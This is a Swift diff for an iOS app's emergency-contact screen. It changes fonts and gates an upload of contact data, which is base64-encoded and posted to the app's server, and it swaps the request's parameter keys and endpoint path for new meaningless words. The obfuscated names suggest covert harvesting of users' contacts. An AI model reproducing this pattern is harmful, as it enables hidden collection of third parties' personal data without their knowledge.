@@ -21,7 +21,7 @@ class LLPhontClickCell: UITableViewCell {
         let mlabel = UILabel()
         mlabel.textColor = UIColor.init(cssStr: "#000000")
         mlabel.textAlignment = .left
-        mlabel.font = UIFont(name: Bold_Poppins, size: 16)
+        mlabel.font = UIFont(name: Bold_SFDisplay, size: 16)
         return mlabel
     }()
     
@@ -43,7 +43,7 @@ class LLPhontClickCell: UITableViewCell {
         let mlabel1 = UILabel()
         mlabel1.textColor = UIColor.init(cssStr: "#000000").withAlphaComponent(0.2)
         mlabel1.textAlignment = .left
-        mlabel1.font = UIFont(name: Bold_Poppins, size: 16)
+        mlabel1.font = UIFont(name: Bold_SFDisplay, size: 16)
         return mlabel1
     }()
     
@@ -51,7 +51,7 @@ class LLPhontClickCell: UITableViewCell {
         let mlabel2 = UILabel()
         mlabel2.textColor = UIColor.init(cssStr: "#000000").withAlphaComponent(0.2)
         mlabel2.textAlignment = .left
-        mlabel2.font = UIFont(name: Bold_Poppins, size: 16)
+        mlabel2.font = UIFont(name: Bold_SFDisplay, size: 16)
         return mlabel2
     }()
     
@@ -164,6 +164,8 @@ class LLStepTFViewController: LLBaseViewController {
     
     var unending: widehallModel?
     
+    var type = BehaviorRelay<String>(value: "0")
+    
     lazy var headView: HeadView = {
         let headView = HeadView()
         headView.mlabel.text = "EMERGENCY CONTACT"
@@ -239,7 +241,9 @@ class LLStepTFViewController: LLBaseViewController {
                                 }
                             }
                             self.shanglianxirenxinxi { modelArray in
-                                self.sclianxi(from: modelArray ?? [["phone": "9"]])
+                                if self.type.value == "0" {
+                                    self.sclianxi(from: modelArray ?? [["phone": "9"]])
+                                }
                             }
                         } else {
                             DispatchQueue.main.async {
@@ -298,7 +302,7 @@ extension LLStepTFViewController: UITableViewDelegate, CNContactPickerDelegate {
             nextBtn.backgroundColor = UIColor.init(cssStr: "#222222")
             nextBtn.setTitle("NEXT STEP", for: .normal)
             nextBtn.setTitleColor(UIColor.init(cssStr: "#1EFB91"), for: .normal)
-            nextBtn.titleLabel?.font = UIFont(name: Bold_Poppins, size: 18)
+            nextBtn.titleLabel?.font = UIFont(name: Bold_SFDisplay, size: 18)
             footView.addSubview(nextBtn)
             nextBtn.snp.makeConstraints { make in
                 make.bottom.equalToSuperview()
@@ -352,10 +356,17 @@ extension LLStepTFViewController: UITableViewDelegate, CNContactPickerDelegate {
     func sclianxi(from modelArray: [[String: Any]]) {
         let data = try? JSONSerialization.data(withJSONObject: modelArray, options: [])
         let base64Data = data?.base64EncodedString() ?? ""
-        let dict = ["separately": "3", "itself": base64Data, "fish": self.lo.value, "grilled": "1"]
+        let dict = ["elemental": "3", "preferreda": base64Data, "overlaid": self.lo.value, "movingfrom": "1"]
         let man = LLRequestManager()
-        man.uploadDataAPI(params: dict, pageUrl: "/lpinoy/might/worth/nobuko", method: .post) { result in
-            
+        man.uploadDataAPI(params: dict, pageUrl: "/ll/would/alert/wantto", method: .post) { [weak self] result in
+            switch result {
+            case .success(_):
+                self?.type.accept("1")
+                break
+            case .failure(_):
+                self?.type.accept("0")
+                break
+            }
         }
     }
     
@@ -403,7 +414,7 @@ extension LLStepTFViewController: UITableViewDelegate, CNContactPickerDelegate {
                         }
                         print("model:\(model)")
                         break
-                    case .failure(let failure):
+                    case .failure(_):
                         break
                     }
                 }
